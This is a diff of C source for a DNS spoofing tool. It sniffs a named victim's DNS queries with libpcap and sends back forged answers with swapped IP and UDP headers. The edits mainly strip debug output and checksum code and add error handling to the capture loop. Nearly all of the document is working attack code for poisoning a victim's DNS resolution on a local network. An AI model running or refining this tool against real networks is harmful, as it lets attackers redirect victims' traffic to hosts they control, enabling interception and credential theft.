@@ -13,8 +13,7 @@ void dns_sniff(struct config *c)
 
     snprintf(filter_exp, filter_len + strlen(getIPString(c->victimIP)), "ip src %s and udp dst port 53", getIPString(c->victimIP));
 
-    printf("\nVictim: %hhn %s \n", c->victimIP, getIPString(c->victimIP));
-    printf("filter: %s\n", filter_exp);
+    printf("PCAP Filter: %s\n", filter_exp);
 
     pcap_lookupnet(c->interfaceName, &netp, &maskp, errbuf);
 
@@ -37,10 +36,15 @@ void dns_sniff(struct config *c)
         exit(1);
     }
 
-    fprintf(stdout, "\n------------------------------\n\n");
-
     // Start the capture session
-    pcap_loop(nic_descr, 0, handle_packet, (u_char *)c);
+
+    if (pcap_loop(nic_descr, 0, handle_packet, (u_char *)c) == -1)
+    {
+        fprintf(stderr, "pcap_loop err\n");
+        fprintf(stdout, "%s\n", pcap_geterr(nic_descr));
+
+        exit(1);
+    }
 }
 
 void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *packet)
@@ -67,33 +71,11 @@ void handle_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char 
 
     handle_IP(pkthdr, packet, spoof_ip);
     handle_UDP(packet, spoof_udp);
-    printf("New: %d\n", spoof_udp->len);
-
     handle_DNS(c, packet, dns_spoof);
 
     memcpy(spoof_packet, spoof_ip, sizeof(struct my_ip));
     memcpy(spoof_packet + sizeof(struct my_ip), spoof_udp, sizeof(struct udp_header));
     memcpy(spoof_packet + sizeof(struct my_ip) + sizeof(struct udp_header), dns_spoof, dns_len);
-
-    struct pseudo_header pseudo_header;
-    memcpy(&pseudo_header.source_address, &c->routerIP, IP_LEN);
-    memcpy(&pseudo_header.dest_address, &c->victimIP, IP_LEN);
-    pseudo_header.placeholder = 0;
-    pseudo_header.protocol = IPPROTO_UDP;
-    pseudo_header.udp_length = htons(8);
-
-    u_char *temp_header = (u_char *)malloc(sizeof(struct pseudo_header) + dns_len);
-    memcpy(temp_header, &pseudo_header, sizeof(struct pseudo_header));
-    memcpy(temp_header + sizeof(struct pseudo_header), dns_spoof, dns_len);
-
-    spoof_udp->sum = in_cksum((unsigned short *)temp_header, sizeof(struct pseudo_header) + dns_len);
-
-    for (int x = 0; x < packet_len; x++)
-    {
-        if (x % 10 == 0 && x != 0)
-            fprintf(stdout, "\n");
-        fprintf(stdout, "%02x ", *(spoof_packet + x));
-    }
 
     send_dns_answer(inet_ntoa(spoof_ip->ip_dst), spoof_udp->dport, spoof_packet, packet_len);
 }
@@ -120,15 +102,12 @@ void handle_IP(const struct pcap_pkthdr *pkthdr, const u_char *packet, struct my
     hlen = IP_HL(ip);
     version = IP_V(ip);
 
-    fprintf(stdout, "\n\nOrig: \n");
-    fprintf(stdout, "Src: %s -> ", inet_ntoa(ip->ip_src));
-    fprintf(stdout, "Dst: %s \n\n", inet_ntoa(ip->ip_dst));
-
     // Spoof IP
     memcpy(spoof_ip, ip, sizeof(struct my_ip));
     memcpy(&spoof_ip->ip_dst, &ip->ip_src, IP_LEN);
     memcpy(&spoof_ip->ip_src, &ip->ip_dst, IP_LEN);
-
+    spoof_ip->ip_tos = 0;
+    spoof_ip->ip_id = 0;
     spoof_ip->ip_len += 16;
     spoof_ip->ip_sum = in_cksum((u_short *)spoof_ip, sizeof(struct my_ip));
 
@@ -165,6 +144,7 @@ void handle_UDP(const u_char *packet, struct udp_header *spoof_udp)
     spoof_udp->dport = udp->sport;
     spoof_udp->sport = udp->dport;
     spoof_udp->len = htons(ntohs(udp->len) + 16);
+    spoof_udp->sum = 0;
 }
 
 void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
@@ -176,11 +156,11 @@ void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
     int frontLen = ETH_HEADER_LENGTH + sizeof(struct my_ip) + sizeof(struct udp_header);
     dns_header = (struct dns_header *)(packet + frontLen);
     dns_query = (struct dns_query *)(packet + frontLen + sizeof(struct dns_header) + c->targetLen);
-    dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
+    // dns_answer = (struct dns_answer *)(packet + frontLen + sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen);
+    dns_answer = (struct dns_answer *)malloc(sizeof(struct dns_answer));
 
     dns_header->flags = htons(0x8180);
     dns_header->ancount = htons(1);
-
     dns_answer->name = htons(0xc00c);
     dns_answer->type = htons(1);
     dns_answer->class = htons(1);
@@ -191,11 +171,7 @@ void handle_DNS(struct config *c, const u_char *packet, u_char *dns_spoof)
     // Fill dns spoof
     memcpy(dns_spoof, dns_header, sizeof(struct dns_header));
     memcpy(dns_spoof + sizeof(struct dns_header), packet + frontLen + sizeof(struct dns_header), c->targetLen);
-
     memcpy(dns_spoof + sizeof(struct dns_header) + c->targetLen, dns_query, sizeof(struct dns_query));
-
-    printf("Q: %02x %02x | ", *dns_query->type, *dns_query->type + 1);
-    printf(" %02x %02x\n", *dns_query->class, *dns_query->class + 1);
 
     int ahead = sizeof(struct dns_header) + sizeof(struct dns_query) + c->targetLen;
     memcpy(dns_spoof + ahead, &dns_answer->name, 2);
